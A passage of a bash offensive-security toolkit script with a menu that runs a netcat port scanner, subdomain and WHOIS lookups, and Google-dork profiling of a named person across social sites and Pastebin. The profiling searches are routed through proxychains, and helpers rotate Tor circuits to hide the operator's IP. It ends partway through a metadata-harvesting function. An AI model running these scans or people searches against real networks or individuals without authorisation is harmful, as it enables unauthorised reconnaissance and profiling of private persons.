#!/bin/bash
# TODO: ADD HEADER INFORMATION
# TODO: Extracting URLs from a Web Page - Web and Internet Users (177) - Chapter 7 - Wicked Cool Scripts

#* ====== CONSTANTS ======

    # Color definitions
    BLACK="\e[30m"
    RED="\e[31m"
    GREEN="\e[32m"
    YELLOW="\e[33m"
    BLUE="\e[34m"
    MAGENTA="\e[35m"
    CYAN="\e[36m"
    WHITE="\e[37m"
    GRAY="\e[90m"

    # Background color definitions
    BG_BLACK="\e[40m"
    BG_RED="\e[41m"

    # Reset terminal color
    RESET="\e[0m"

    # Version
    VERSION="0.15.2"

    # Darth Release
    RELEASE="VADER"

    # Author (jpgress@gmail.com)
    AUTHOR="R3v4N's 0wL"

#* ====== SUPPORT FUNCTIONS (A-Z) ======
    # Function: Enable Proxychains
    function ascii_banner_art() {
        
            #! Banner full 
                #!  ██████╗ ██╗    ██╗██╗         ██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗████████╗    ███████╗ ██████╗██████╗ ██╗██████╗ ████████╗
                #! ██╔═████╗██║    ██║██║         ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝    ██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝
                #! ██║██╔██║██║ █╗ ██║██║         ██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ███████╗   ██║       ███████╗██║     ██████╔╝██║██████╔╝   ██║   
                #! ████╔╝██║██║███╗██║██║         ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ╚════██║   ██║       ╚════██║██║     ██╔══██╗██║██╔═══╝    ██║   
                #! ╚██████╔╝╚███╔███╔╝███████╗    ██║     ███████╗██║ ╚████║   ██║   ███████╗███████║   ██║       ███████║╚██████╗██║  ██║██║██║        ██║   
                #!  ╚═════╝  ╚══╝╚══╝ ╚══════╝    ╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝       ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   
        echo
        echo -e "\t\t ${RED}${BG_BLACK} ██████╗ ██╗    ██╗██╗        ██████╗ ██████╗ ███████╗ ${RESET}"
        echo -e "\t\t ${RED}${BG_BLACK}██╔═████╗██║    ██║██║       ██╔═══██╗██╔══██╗██╔════╝ ${RESET}"
        echo -e "\t\t ${RED}${BG_BLACK}██║██╔██║██║ █╗ ██║██║       ██║   ██║██████╔╝███████╗ ${RESET}"
        echo -e "\t\t ${RED}${BG_BLACK}████╔╝██║██║███╗██║██║       ██║   ██║██╔═══╝ ╚════██║ ${RESET}"
        echo -e "\t\t ${RED}${BG_BLACK}╚██████╔╝╚███╔███╔╝███████╗  ╚██████╔╝██║     ███████║ ${RESET}"
        echo -e "\t\t ${RED}${BG_BLACK} ╚═════╝  ╚══╝╚══╝ ╚══════╝   ╚═════╝ ╚═╝     ╚══════╝ ${RESET}"
        author_version;
    }

    # Function: Display the menu header with the script name and author
    function author_version() {
        echo -e "\t\t ${BG_RED}${BLACK} 0wL Operators Script by $AUTHOR - v$VERSION ($RELEASE)${RESET}"
        subtitle;
    }

    # Function: 3-second countdown
    function countdown() {
        local seconds=3 # Number of seconds for the countdown

        # Countdown loop
        while [ $seconds -gt 0 ]; do
            echo -ne "${GRAY} >>> Starting in: $seconds \r${RESET}" # Display the countdown and overwrite the same line
            sleep 1 # Wait for 1 second
            ((seconds--)) # Decrease the countdown value
        done
    }

    # Function: Disabled
    function disabled() {
        echo ""
        echo -e "${RED} >>> FUNCTION DISABLED <<< ${RESET}"
        echo ""
        echo -e "${GRAY} Press ENTER to continue ${RESET}"
        read -r
        main_menu
    }
    
    # Function: Display banner inside functions
    function display_banner_inside_functions(){
        clear;  # Clear the terminal screen for clean output
        ascii_banner_art;  # Display ASCII art banner
        echo -e "${MAGENTA}\t\t\t$title ${RESET}"
        subtitle;  # Display a subtitle
    }
    
    # Function: display command usage
    function display_command(){
        local command="$1"
        echo -e "${GREEN} $ $command${RESET}"
        echo
    }
    
    # Function to display description usage
    function display_description() {
        local description="$1"
        echo -e "${RED} Description: $description${RESET}"
        echo
    }

    # Function: Display section inside some functions
    function display_section() {
        local title="$1"
        echo -e "# SECTION: $title" | tee -a "$LOG_FILE"
        subtitle
        echo -e "" | tee -a "$LOG_FILE"
    }

    # Function: Display section inside some functions WITH NO LOG
    function display_section_no_log() {
        local title="$1"
        echo -e "# SECTION: $title" 
        subtitle
        echo -e ""
    }

    # Function: Enable TOR routing for Proxychains
    function enable_proxychains() {
        clear; # Clear terminal screen
        ascii_banner_art; # Call ASCII banner art
        
        # Check if proxychains is installed
        if ! command -v proxychains &> /dev/null; then
            echo -e "${RED} >>> ERROR: proxychains is not installed. Please install it before running the script. <<< ${RESET}"
            exit 1
        fi

        # Check if the proxychains configuration file exists
        if [[ ! -f /etc/proxychains.conf ]]; then
            echo -e "${RED} >>> ERROR: Proxychains configuration file not found. Make sure /etc/proxychains.conf exists. <<< ${RESET}"
            exit 1
        fi

        # Test proxychains by attempting a simple network request
        echo -e "${GRAY} >>> Testing proxychains with 'proxychains curl -I https://dnsleaktest.com'${RESET}"
        echo -e "${GRAY} >>> Please wait a moment...${RESET}"
        if proxychains curl -I https://dnsleaktest.com &> /dev/null; then
            echo -e "${GRAY} >>> Proxychains is working correctly. All traffic will be routed through it.${RESET}"
            #countdown; # Wait for 3 seconds before continuing
            export PROXYCHAINS=1
        else
            echo -e "${RED} >>> WARNING: Proxychains test failed. Please verify your proxychains configuration. <<< ${RESET}"
            export PROXYCHAINS=0
        fi
    }

    # Function: Error message for invalid usage
    function error_invalid_usage() {
        clear
        echo ""
        echo -e "${BG_BLACK}${RED} >>> ERROR! <<< ${RESET}"
        echo ""
        echo -e "${BG_BLACK}${RED} Usage: $0 ${RESET}"
        exit 1
    }

    # Function: Error message for non-root users
    function error_not_root() {
        clear
        echo ""
        echo -e "${BG_BLACK}${RED} >>>>> YOU MUST BE ROOT TO RUN THIS SCRIPT! <<<<< ${RESET}"
        echo ""
        exit 1
    }

    # Exit the script gracefully
    function exit_script() {
        echo
        echo -e "${CYAN} Exiting... Thank you for using the script! ${RESET}"
        exit 0
    }

    # Function: Exit to main menu
    function exit_to_main_menu(){
        # Wait for the user to press ENTER before returning to the main menu
        echo -e "${GRAY} Press ENTER to return to the main menu.${RESET}"
        read -r 2>/dev/null
        main  # Return to the main menu
        exit 0  # Exit the script
    }

    # Function: Invalid option
    function invalid_option() {
        echo -e "${BLACK} ${BG_RED} INVALID OPTION!${RESET}${RED} - Please run the script again and choose a valid option.${RESET}"
        echo -e "${GRAY} Press ENTER to continue ${RESET}"
        read -r
        main_menu
    }

    function log_and_display() {
        local message="$1"
        echo -e "$(date '+[%Y-%m-%d %H:%M:%S]')" | tee -a "$LOG_FILE"
        echo -e "$message" | tee -a "$LOG_FILE"
        echo -e "" | tee -a "$LOG_FILE"
    }

    # Function: Pause the script
    function pause_script() {
        echo -e "${GRAY} Press ENTER to continue ${RESET}"
        read -r 2> /dev/null
        main_menu
    }

    # Function to restart the Tor service for IP rotation
    function restart_tor() {
        echo ""
        echo -e "${MAGENTA} Restarting Tor to rotate IP.${RESET}"
        echo -e "${GRAY} Please wait...${RESET}"
        if sudo systemctl restart tor; then
            echo -e "${GREEN} =====================================================${RESET}"
            echo -e "${GREEN} Tor restarted successfully. New IP circuit activated!${RESET}"
            echo ""
            sleep 4  # Allow time for the new circuit to establish
        else
            echo -e "${RED}Failed to restart Tor. Check your Tor configuration or service status.${RESET}"
            exit 1
        fi
    }

    function show_help() {
        echo -e "${CYAN}0wL OPS - Offensive Security Toolkit${RESET}"
        echo -e "${GRAY}Usage:${RESET}"
        echo -e "  ./0wl.sh                # Launch interactive menu"
        echo -e "  ./0wl.sh [option]       # Run a specific function"
        echo -e "  ./0wl.sh -h | --help    # Show this help menu"
        echo
        echo -e "${GRAY}Available Functions:${RESET}"
        echo -e "$(display_numbered_menu_options;)"
        echo
        echo -e "${GRAY}Example Usage:${RESET}"
        echo -e "  ./0wl.sh 12       # Instantly run Linux System Information"
        echo -e "  ./0wl.sh 5        # Perform a DNS Zone Transfer"
        echo
        exit 0
    }

    #! TODO: RENAME THIS FUNCTION TO A BETTER NAME
    function subtitle() {
        echo -e "${RED}+====================================================================================+${RESET}"
    }

    # Function: Validate user input for the main menu
    function validate_input() {
        local input="$1" # The input to validate
        local valid_options=("$@") # All valid options passed as arguments (from the second argument onward)

        # Check if the input is in the list of valid options
        for option in "${valid_options[@]:1}"; do
            if [[ "$input" == "$option" ]]; then
                return 0 # Input is valid
            fi
        done

        # If we reach here, the input is invalid
        echo -e "${RED} >>> Invalid option: $input. Please choose a valid menu option. <<< ${RESET}"
        return 1 # Input is invalid
    }

#* ====== MAIN FUNCTION ======
    # Display numbered menu options
    function display_numbered_menu_options() {
        echo -e "${GREEN} [01] Portscan (Netcat) ${RESET}" 
        echo -e "${GREEN} [02] Parsing HTML ${RESET}" 
        echo -e "${GREEN} [03] Google Hacking for people OSINT ${RESET}" 
        echo -e "${GREEN} [04] Metadata Analysis ${RESET}" 
        echo -e "${GREEN} [05] DNS Zone Transfer ${RESET}" 
        echo -e "${GREEN} [06] Subdomain Takeover ${RESET}" 
        echo -e "${GREEN} [07] Reverse DNS ${RESET}" 
        echo -e "${GREEN} [08] DNS Reconnaissance ${RESET}"
        echo -e "${GREEN} [09] MiTM (Man-in-the-Middle) ${RESET}"
        echo -e "${GREEN} [10] Portscan (Bash sockets) ${RESET}"
        echo -e "${GREEN} [11] Useful Commands for Network Management (Quick Ref) ${RESET}"
        echo -e "${GREEN} [12] System Information (Linux OS) ${RESET}"
        echo -e "${GREEN} [13] Attack Surface Analysis (find Based) ${RESET}"
        echo -e "${GREEN} [14] find Examples (Quick Ref) (Linux OS) ${RESET}"
        echo -e "${GREEN} [15] Root Password Reset Guide (Linux OS) ${RESET}"
        echo -e "${GRAY} [16] Quick Guide to Using Vim ${RESET}"
        echo -e "${GRAY} [17] Escape Techniques for rbash (Testing) ${RESET}"
        echo -e "${GRAY} [18] Wireless Network Attacks ${RESET}"
        echo -e "${GRAY} [19] Windows Tips ${RESET}"
        echo -e "${GRAY} [20] Create Scripts in .bat or .ps1 ${RESET}"
        echo -e "${GRAY} [21] Reverse Shell for Windows ${RESET}"
        echo -e "${GRAY} [22] RDP for Windows ${RESET}"
        echo -e "${GRAY} [23] Examples of the 'find' Command ${RESET}"
        echo -e "${GREEN} [00] Exit ${RESET}"
        echo -e "${RED}+=================================== ${GREEN}\u2143w0.0wL${RESET}${RED} ========================================+${RESET}"
    }

    # Function: Main menu with Fast Mode execution
    function main() {
        # Description:
            # This function handles both interactive menu navigation and fast mode execution.
            #
            # Features:
            # - If a valid function number is passed as an argument, it runs that function instantly.
            # - If no argument is provided, it launches the interactive menu.
            # - If '-h' or '--help' is provided, it shows the help menu.
            #
            # Example usage:
            # ./0wl.sh           # Interactive menu
            # ./0wl.sh 12        # Instantly run Linux System Info
            # ./0wl.sh -h        # Show help menu

        # If no argument is provided, launch interactive menu
        function display_banner_main_menu(){    
            clear  # Clear the screen
            ascii_banner_art  # Display ASCII banner
            echo -e "${GREEN}\t\tSelect an option by entering the corresponding number${RESET}"
            subtitle  # Show a subtitle
        }

        # Process menu selection
        function process_menu_option() {
            local option="$1"
            case $option in
                0) exit_script ;;  
                1) portscan ;;  
                2) parsing_html ;;  
                3) google_hacking ;;  
                4) metadata_analysis ;;  
                5) dns_zt ;;  
                6) Subdomain_takeover ;;  
                7) rev_dns ;;  
                8) recon_dns ;;  
                9) mitm ;;  
                10) portscan_bashsocket ;;  
                11) useful_linux_commands ;;  
                12) linux_sysinfo ;;  
                13) find_based_attack_surface_analysis ;;  
                14) find_command_examples ;;
                15) linux_root_password_reset ;; 
                16) xvi_vim_quick_guide ;;  
                18) xviii_wifi_attacks ;;  
                19) xix_windows_basic_commands ;;  
                21) xxi_sgt_domingues_scanning_script ;;  
                22) xxii_nmap_network_discovery ;;  
                *) invalid_option ;;  
            esac
        }

        function validate_input() {
            local input="$1"
            local valid_options=( $(seq 0 25) )  # Create a list of valid options (0-25)
            valid_options=("${valid_options[@]/23}")  # Remove invalid option 23
            for valid in "${valid_options[@]}"; do
                if [[ "$input" == "$valid" ]]; then
                    return 0  
                fi
            done
            return 1  
        }

        function prompt_user_inputs() {
            echo -ne "${GREEN} Enter the option number: ${RESET}"
            read -r MENU_OPTION
            if [[ "$MENU_OPTION" == "0" || "$MENU_OPTION" == "00" ]] ; then
                    exit_script
                    return 0
                else
                    MENU_OPTION=$(echo "$MENU_OPTION" | sed 's/^0*//')
            fi

            if ! validate_input "$MENU_OPTION"; then
                invalid_option
                main_menu_workflow
                return
            fi

            process_menu_option "$MENU_OPTION"
        }

        function main_menu_workflow() {
            display_banner_main_menu
            display_numbered_menu_options
            prompt_user_inputs
        }

        main_menu_workflow
    }

#* ====== MAIN SCRIPTS (A-Z) ======
    #! TODO: ORDER ALPHABETICALLY ALL THE FUNCTIONS BELOW
    # Function: Script to perform a port scan on a network using netcat
    function portscan() {
        # i_portscan - Script to perform a port scan on a network using netcat
            #
            # Description:
            # This script performs the following operations:
            # 1. Checks for common open ports on all hosts within a specified IP range (CIDR format).
            # 2. Dynamically loads a user-defined number of top ports (e.g., 20, 100, 1000) from Nmap's services file, if available.
            # 3. Falls back to a predefined list of common ports if Nmap's file is unavailable.
            # 4. Prints results for each host and open port found.
            # 5. Saves the results in two file formats:
            #    - Plain text (`portscan_results.txt`) for human-readable output.
            #    - CSV (`portscan_results.csv`) for structured data analysis.
            #
            # Dependencies:
            # - netcat (nc): To perform the port scanning.
            # - ipcalc: To validate and parse CIDR-based network masks.
            # - awk: To process data from Nmap's services file.
            #
            # Author: R3v4N (w/GPT)
            # Created on: 2025-01-23
            # Last Updated: 2025-01-24
            # Version: 1.2
            #
            # Version history:
            # - 1.0 (2025-01-23): Initial version with basic port scanning functionality.
            # - 1.1 (2025-01-23): Added support for saving results in `.txt` and `.csv` formats.
            #                     Integrated dynamic port loading from Nmap's services file.
            # - 1.2 (2025-01-23): Added user input to define the number of top ports to scan.
            #                     Improved flexibility and user control over scan depth.
            #
            # Notes:
            # - Ensure the required dependencies are installed before running the script.
            # - If `ipcalc` is not installed, the script will attempt to install it automatically.
            # - Users can dynamically select the number of top ports to scan.
            # - Results are saved in the current working directory as `portscan_results.txt` and `portscan_results.csv`.
            # - Handles Ctrl+C interruptions gracefully and returns to the main menu.
            #
            # Example usage:
            # - Input:
            #   - Number of ports: 100
            #   - CIDR: "192.168.1.0/24"
            # - Output:
            #   - Terminal: "Host: 192.168.1.1 - Open Port: 80"
            #   - Text File: "Host: 192.168.1.1 - Open Port: 80"
            #   - CSV File: "192.168.1.1,80,Open"

        clear
        echo -e "${MAGENTA}1 - Portscan using netcat ${RESET}"
        echo -e "${GRAY}+======================================================================+${RESET}"
        echo -e "${GRAY}This port scan checks common open ports on all hosts in the network."
        echo -e "${GRAY}+======================================================================+${RESET}"

        # Ask the user how many top ports they want to scan
        echo -ne "${CYAN}Enter the number of top ports to scan (e.g., 20, 100, 1000): ${RESET}"
        read -r TOP_PORTS

        # Validate the user's input (ensure it's a positive number)
        if ! [[ "$TOP_PORTS" =~ ^[0-9]+$ ]] || [[ "$TOP_PORTS" -le 0 ]]; then
            echo -e "${RED}Invalid input! Please enter a positive number.${RESET}"
            main_menu
            return
        fi

        # Load ports dynamically from Nmap or use a fallback list
        local nmap_services="/usr/share/nmap/nmap-services" # Path to Nmap's services file
        local fallback_ports="80,23,443,21,22,25,3389,110,445,139,143,53,135,3306,8080,1723,111,995,993,5900"

        if [[ -f "$nmap_services" ]]; then
            # Extract the top N ports based on the user's choice
            PORT_LIST=$(awk '!/^#/ {print $2}' "$nmap_services" | grep -Eo '^[0-9]+' | sort -n | uniq | head -n "$TOP_PORTS" | paste -sd ',')

            if [[ -n "$PORT_LIST" ]]; then
                echo -e "${GREEN}Loaded the TOP $TOP_PORTS ports from Nmap's services file: $nmap_services${RESET}"
            else
                echo -e "${YELLOW}Warning: Failed to extract ports from Nmap's services file. Falling back to predefined ports.${RESET}"
                PORT_LIST="$fallback_ports"
            fi
        else
            echo -e "${YELLOW}Warning: Nmap services file not found at $nmap_services. Falling back to predefined ports.${RESET}"
            PORT_LIST="$fallback_ports"
        fi

        # Handle Ctrl+C interruptions gracefully
        trap 'echo -e "\nScript interrupted by user."; main_menu; exit 1' SIGINT

        # Ask user to enter the IP range in CIDR notation
        echo -ne "${CYAN}Enter the IP range in CIDR notation (e.g., 192.168.1.0/24): ${RESET}"
        read -r NETWORK_MASK

        # Validate the network mask
        if ! ipcalc -n -b -m "$NETWORK_MASK" >/dev/null 2>&1; then
            echo "Invalid network mask."
            main_menu
            return
        fi

        # Extract the network prefix from the mask
        NETWORK_PREFIX=$(ipcalc -n -b "$NETWORK_MASK" | awk '/Network/ {print $2}' | awk -F. '{print $1"."$2"."$3}')

        # Start scanning each host in the network for the specified ports
        echo -e "${CYAN}Scanning network: $NETWORK_MASK ${RESET}"
        for HOST in $(seq 1 254); do
            IP="$NETWORK_PREFIX.$HOST"
            for PORT in $(echo "$PORT_LIST" | tr ',' ' '); do
                # Check if the port is open on the host
                nc -z -w 1 "$IP" "$PORT" 2>/dev/null
                if [ $? -eq 0 ]; then
                    echo -e "${GREEN}Host: $IP - Open Port: $PORT ${RESET}"
                fi
            done
        done

        # Completion message
        echo -e "${GREEN}Scan completed for $NETWORK_MASK using the TOP $TOP_PORTS ports.${RESET}"
        echo -e "${GRAY}Press ENTER to continue...${RESET}"
        read -r
        main_menu
    }

    # Function: Script to analyze subdomains and WHOIS information for a website or a list of websites.
    function parsing_html() {
        # parsing_html - Script to analyze subdomains and WHOIS information for a website or a list of websites.
            #
            # Description:
            # This script performs the following operations:
            # 1. Extracts subdomains from an HTML page.
            # 2. Retrieves IP addresses associated with each subdomain.
            # 3. Fetches WHOIS information for each domain.
            # 4. Generates a report with the results.
            #
            # Dependencies:
            # - curl: To make HTTP requests.
            # - dig: To retrieve IP addresses of subdomains.
            # - whois: To get WHOIS information for domains.
            # - nslookup: For DNS lookups.
            #
            # Author: R3v4N (w/GPT)
            # Created on: 2024-01-15
            # Last Updated: 2024-01-24
            # Version: 1.1
            #
            # Version history:
            # - 1.0 (2024-01-15): Initial version with basic subdomain and WHOIS functionality.
            # - 1.1 (2024-01-24): Added dependency checks and updated timestamp format.
            #
            # Example usage:
            # - Input: https://example.com
            # - Output: Subdomains, IP addresses, WHOIS information for each domain.
            #
            # Notes:
            # - Ensure the dependencies are installed before running the script.
            # - The report is saved in a file named "result_<URL>_<date>.txt".
            #

        # Function to check if dependencies are installed
        check_dependencies() {
            local dependencies=("curl" "whois" "nslookup" "dig")
            for dep in "${dependencies[@]}"; do
                if ! command -v "$dep" &>/dev/null; then
                    echo -e "${RED}Error: Dependency '$dep' is not installed.${RESET}"
                    echo "Please install '$dep' before running this script."
                    exit 1
                fi
            done
        }

        # Call the dependency check function
        check_dependencies

        # Prompt the user to input the desired website URL
        echo -n "Enter the URL of the website to analyze (e.g.: businesscorp.com.br): "
        read -r SITE

        # Store the current date and time in the specified format (day-hour-minutes-month-year)
        timestamp=$(date +"%d%H%M%b%Y" | tr '[:lower:]' '[:upper:]') # Example: 241408JAN2024
        output_file="result_${SITE}_${timestamp}.txt"

        # Function to print text in color
        print_color() {
            local color=$1
            local text=$2
            echo -e "\e[0;${color}m${text}\e[0m"
        }

        # Function to extract subdomains from an HTML page
        extract_subdomains() {
            local site=$1
            curl -s "$site" | grep -Eo '(http|https)://[^/"]+' | awk -F[/:] '{print $4}' | sort -u
        }

        # Function to get the IP address of a subdomain
        get_ip_address() {
            local subdomain=$1
            local ip_address
            ip_address=$(host "$subdomain" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -n 1)
            echo "$ip_address:$subdomain"
        }

        # Function to get WHOIS information for a domain
        get_whois_info() {
            local domain=$1
            whois "$domain" | grep -vE "^\s*(%|\*|;|$|>>>|NOTICE|TERMS|by|to)" | grep -E ':|No match|^$'
        }

        # Function to get DNS lookup information for a domain
        get_dns_info() {
            local domain=$1
            nslookup "$domain" 2>/dev/null | grep "Address" | awk '{print $2}' | sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/, /g'
        }

        # Add the timestamp to the beginning of the output file
        echo -e "Report generated on: $timestamp\n" > "$output_file"

        # Analyze the provided site
        print_color 33 "Analyzing subdomains for: $SITE"
        subdomains=($(extract_subdomains "$SITE"))

        # Check if any subdomains were found
        if [ ${#subdomains[@]} -eq 0 ]; then
            print_color 31 "No subdomains found for: $SITE"
            echo "No subdomains found for: $SITE" >> "$output_file"
        else
            print_color 32 "Subdomains found:"
            for subdomain in "${subdomains[@]}"; do
                print_color 36 "$subdomain"

                # Get IP address for the subdomain
                ip_result=$(get_ip_address "$subdomain")
                echo "$ip_result" >> "$output_file"

                # Add WHOIS information
                print_color 34 "WHOIS information for $subdomain"
                get_whois_info "$subdomain" >> "$output_file"

                # Add DNS lookup information
                print_color 34 "DNS Lookup information for $subdomain"
                get_dns_info "$subdomain" >> "$output_file"

                echo -e "\n" >> "$output_file"
            done
        fi

        # Completion message
        print_color 32 "Analysis complete. Results saved to: $output_file"
        echo -e "${GRAY}Press ENTER to continue${RESET}"
        read -r 2>/dev/null
        main_menu
    }

    # Function: Script to automate Google hacking queries for reconnaissance
    function google_hacking() {
        # iii_google_hacking - Automates Google hacking queries for reconnaissance
            #
            # Description:
            # This script automates Google hacking techniques to gather information about a target.
            # It performs the following operations:
            # 1. Conducts general searches for the target using Google.
            # 2. Searches for specific file types (e.g., PDF, DOCX) containing the target's name.
            # 3. Searches within specific websites (e.g., LinkedIn, Pastebin) for target-related data.
            # 4. Verifies the user's IP address for anonymity before performing queries.
            # 5. Logs all search URLs and details to a file for reference and auditing.
            #
            # Improvements in Version 1.5:
            # - Fixed Logical Issue: Browser queries now run in the background to prevent blocking subsequent searches.
            # - Enhanced Logging: Debug logs added to track query progress and identify any potential bottlenecks.
            # - Simplified IP Verification: Replaced interactive browser-based IP check with a lightweight `curl` request.
            # - Improved Stability: Introduced better flow control and error handling for proxy execution.
            #
            # Dependencies:
            # - Firefox or a compatible browser (default: Firefox).
            # - proxychains4: To route queries through proxies for anonymity.
            # - curl: For lightweight IP verification.
            #
            # Author: R3v4N (w/GPT)
            # Created on: 2024-01-15
            # Last Updated: 2025-01-25
            # Version: 1.5
            #
            # Version history:
            # - 1.0 (2024-01-15): Initial version with basic Google hacking queries.
            # - 1.1 (2024-01-24): Refactored for modularity, added input validation, improved user prompts, and added error handling.
            # - 1.2 (2024-01-24): Introduced logging for all searches to a timestamped file.
            # - 1.3 (2024-01-25): Integrated proxy rotation for anonymity and processed dorks for proper formatting.
            # - 1.4 (2024-01-25): Refactored repetitive `proxychains4 $SEARCH` calls into a reusable function.
            # - 1.5 (2025-01-25): Resolved blocking issue with browser queries, enhanced logging, and improved flow control.
            #
            # Example usage:
            # - Input: "Fatima de Almeida Lima"
            # - Output:
            #   - General Google queries, file type searches, and specific website searches performed anonymously.
            #   - Log file saved as "<TARGET>_<timestamp>.log".
            #
            # Notes:
            # - Ensure Firefox or the browser specified in the `SEARCH` variable is installed.
            # - Logs are saved as "<TARGET>_<timestamp>.log" in the current directory.
            # - Designed for educational purposes only; respect applicable laws and ethics.


        # Default browser for search
        SEARCH="firefox"

        # Function to ensure the browser is installed
        function check_browser() {
            if ! command -v "$SEARCH" >/dev/null 2>&1; then
                echo -e "${RED}Error: The browser '$SEARCH' is not installed. Please install it or update the 'SEARCH' variable.${RESET}"
                return 1
            fi
            if ! command -v "proxychains4" >/dev/null 2>&1; then
                echo -e "${RED}Error: 'proxychains4' is not installed. Please install it to enable proxy rotation.${RESET}"
                return 1
            fi
        }

        # Function to prompt the user for the target name
        function google_hacking_menu() {
            clear
            echo -e "${RED}Google Hacking OSINT for People Reconnaissance${RESET}"
            echo -e "${YELLOW}+=============================================+${RESET}"
            echo -e "${CYAN}For better results, put the target in quotes (e.g., \"Fatima de Almeida Lima\").${RESET}"
            echo -n "Enter the target name for the search: "
            read -r TARGET

            # Validate input
            while [[ -z "$TARGET" ]]; do
                echo "Target name cannot be empty. Please try again."
                echo -n "Enter the target name for the search: "
                read -r TARGET
            done

            # Process target as a proper dork (quoted and URL encoded)
            PROCESSED_TARGET=$(echo "\"$TARGET\"" | sed 's/ /%20/g')

            # Create a timestamped log file for the target
            TIMESTAMP=$(date +"%d%H%M%b%Y" | tr '[:lower:]' '[:upper:]')
            LOG_FILE="${TARGET}_${TIMESTAMP}.log"
            echo -e "Log for target: $TARGET\nGenerated on: $(date)\n" > "$LOG_FILE"
        }

        # Function to execute a search query through proxychains
        function perform_query() {
            local url=$1
            echo "Executing query: $url"
            echo "$url" >> "$LOG_FILE"  # Log the query
            proxychains4 $SEARCH "$url" 2>/dev/null &  # Run in the background
            sleep 1  # Optional delay between queries
        }

        # Function to check the current IP address
        function check_ip() {
            echo "Checking your current IP address..."
            local ip=$(curl -s https://api.ipify.org)
            if [[ -z "$ip" ]]; then
                echo "Failed to retrieve IP address. Please check your connection or proxy settings."
                echo "Failed to retrieve IP address." >> "$LOG_FILE"
            else
                echo "Your current IP address is: $ip"
                echo "Current IP address: $ip" >> "$LOG_FILE"
            fi
        }

        # Function for general searches
        function generalSearch() {
            check_ip  # Check and log the IP address
            perform_query "https://webmii.com/people?n=$PROCESSED_TARGET"  # Search on WEBMII
            perform_query "https://www.google.com/search?q=intext:$PROCESSED_TARGET"  # General Google search
        }

        # Function for searches within specific websites
        function siteSearch() {
            local site="$1"
            local domain="$2"
            perform_query "https://www.google.com/search?q=inurl:$domain+intext:$PROCESSED_TARGET"
        }

        # Function for file type searches
        function FileSearch() {
            local type="$1"
            local extension="$2"
            perform_query "https://www.google.com/search?q=filetype:$extension+intext:$PROCESSED_TARGET"
        }

        # Check if the browser and proxychains4 are installed
        check_browser || return 1

        # Prompt for the target name
        google_hacking_menu

        # Perform general searches
        generalSearch

        # List of file types and their extensions for targeted searches
        file_types=("PDF" "PPT" "DOC" "DOCX" "XLS" "XLSX" "ODS" "ODT" "TXT" "PHP" "XML" "JSON" "PNG" "SQLS" "SQL")
        extensions=("pdf" "ppt" "doc" "docx" "xls" "xlsx" "ods" "odt" "txt" "php" "xml" "json" "png" "sqls" "sql")

        # Perform file type searches
        for ((i = 0; i < ${#file_types[@]}; i++)); do
            echo "Processing file type: ${file_types[i]} with extension: ${extensions[i]}" >> "$LOG_FILE"
            FileSearch "${file_types[i]}" "${extensions[i]}"
            echo "Finished processing file type: ${file_types[i]}" >> "$LOG_FILE"
        done

        # List of sites and their corresponding domains for targeted searches
        sites=("Government" "Pastebin" "Trello" "GitHub" "LinkedIn" "Facebook" "Twitter" "Instagram" "TikTok" "YouTube" "Medium" "Stack Overflow" "Quora" "Wikipedia")
        domains=(".gov.br" "pastebin.com" "trello.com" "github.com" "linkedin.com" "facebook.com" "twitter.com" "instagram.com" "tiktok.com" "youtube.com" "medium.com" "stackoverflow.com" "quora.com" "wikipedia.org")

        # Perform searches on specific sites
        for ((i = 0; i < ${#sites[@]}; i++)); do
            echo "Processing site: ${sites[i]} with domain: ${domains[i]}" >> "$LOG_FILE"
            siteSearch "${sites[i]}" "${domains[i]}"
            echo "Finished processing site: ${sites[i]}" >> "$LOG_FILE"
        done

        echo -e "${GRAY}All searches logged in: $LOG_FILE${RESET}"
        echo -e "${GRAY}Press ENTER to return to the main menu.${RESET}"
        read -r 2>/dev/null
        main_menu
    }   

    # Function: Perform metadata analysis for files on specific domains
    function metadata_analysis() {
        # Metadata Analysis - Perform metadata analysis for files on specific domains    
            # ==============================================================================
            # Metadata Analysis
            # Version: 1.2 (2024-01-25)
            # Author: R3v4N|0wL (jpgress@gmail.com)
            #
            # Description:
            # This script automates the process of performing metadata analysis on files
            #
            # Description:
            # This function automates the process of performing metadata analysis on files 
            # retrieved from specified domains or websites. It performs the following steps:
            # 1. Prompts the user for domain, file type, and an optional keyword for filtering.
            # 2. Searches Google for URLs of the specified file type and downloads the files.
            # 3. Extracts metadata fields (e.g., Author, Producer, Creator, MIME Type) using `exiftool`.
            # 4. Organizes and summarizes the metadata into an easy-to-read format and exports to CSV.
            # 5. Handles common errors like empty results or failed downloads to ensure a robust workflow.
            #
            # Dependencies:
            # - `lynx`: Used for performing Google searches.
            # - `wget`: Used for downloading files from the URLs found in the search results.
            # - `exiftool`: Used for extracting metadata from downloaded files.
            # - `grep`: Used for filtering and processing search results and metadata.
            #
            # Notes:
            # - Ensure all dependencies are installed and accessible in your `$PATH`.
            # - The function saves intermediate and final results to timestamped files and folders.
            # - Random user-agent rotation is implemented for downloads to avoid detection.
            #
            # Example Usage:
            # - Input:
            #     Domain: `businesscorp.com.br`
            #     File type: `pdf`
            #     Keyword: `employee`
            # - Output:
            #     - Search results in `TIMESTAMP_filtered.txt`
            #     - Downloaded files in `DOMAIN_TIMESTAMP/`
            #     - Metadata summary in `DOMAIN_TIMESTAMP_metadata_summary.txt`
            #     - Organized summary in `DOMAIN_TIMESTAMP_organized_metadata_summary.txt`
            #     - Metadata CSV in `DOMAIN_TIMESTAMP_metadata_summary.csv`
            #
            # Version History:
            # - 1.0 (2025-01-24): Initial implementation of metadata analysis workflow.
            # - 1.1 (2025-01-25): Improved error handling, user-agent rotation, and metadata processing.
            # - 1.2 (2025-01-25): Added structured output (CSV and organized summary) and validation.
            #
            # Author: R3v4N (w/ GPT assistance)
            # ==============================================================================

        # This script sets the SEARCH variable to use the 'lynx' command-line web browser.
        # The 'lynx' command is configured with the following options:
        # -dump: Outputs the formatted document to standard output.
